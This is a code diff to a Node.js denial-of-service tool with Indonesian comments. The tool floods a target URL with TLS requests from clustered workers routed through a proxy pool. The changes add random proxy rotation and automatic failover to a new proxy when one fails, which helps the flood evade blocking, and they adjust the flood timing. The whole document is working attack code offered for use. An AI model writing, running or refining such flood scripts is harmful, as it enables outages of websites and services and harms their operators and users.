@@ -21,6 +21,12 @@ if (proxies.length === 0) {
     process.exit(1);
 }
 
+// Fungsi untuk memilih proxy acak dari pool
+function getRandomProxy() {
+    const randomIndex = Math.floor(Math.random() * proxies.length);
+    return proxies[randomIndex];
+}
+
 if (cluster.isMaster) {
     console.log(`Starting attack on ${targetURL} for ${duration} seconds using ${threads} threads`);
 
@@ -40,7 +46,10 @@ if (cluster.isMaster) {
     const target = new URL(targetURL);
     const startTime = Date.now();
 
-    function sendTLSRequest(proxy) {
+    let activeProxy = null; // Menyimpan proxy aktif
+
+    function sendTLSRequest() {
+        let proxy = activeProxy ? activeProxy : getRandomProxy(); // Gunakan proxy aktif jika ada
         const proxyParts = proxy.trim().split(":");
         if (proxyParts.length < 2) return;
 
@@ -55,6 +64,8 @@ if (cluster.isMaster) {
         };
 
         const client = tls.connect(options, () => {
+            activeProxy = proxy; // Tandai proxy yang aktif
+
             function flood() {
                 if (Date.now() - startTime >= duration * 1000) {
                     console.log(`Worker ${process.pid} stopping attack.`);
@@ -70,13 +81,17 @@ if (cluster.isMaster) {
                     client.write(request);
                 }
 
-                setTimeout(flood, 10); // Delay kecil untuk mengurangi beban CPU
+                setTimeout(flood, 50); // Mengatur waktu delay flood menjadi 50ms
             }
             flood();
         });
 
         client.on("error", () => {
+            console.log(`Proxy ${proxy} failed. Trying another proxy...`);
             client.destroy();
+            // Jika proxy gagal, pilih proxy baru
+            activeProxy = null; // Reset proxy aktif yang gagal
+            sendTLSRequest(); // Coba proxy lain
         });
 
         client.on("close", () => {
@@ -90,10 +105,8 @@ if (cluster.isMaster) {
             process.exit(0);
         }
 
-        // Kirim permintaan ke target menggunakan semua proxy secara bersamaan
-        proxies.forEach(proxy => {
-            sendTLSRequest(proxy);
-        });
+        // Kirim permintaan ke target menggunakan proxy acak dari pool atau proxy aktif
+        sendTLSRequest();
 
         setTimeout(attackLoop, 10); // Delay kecil agar CPU tidak overload
     }
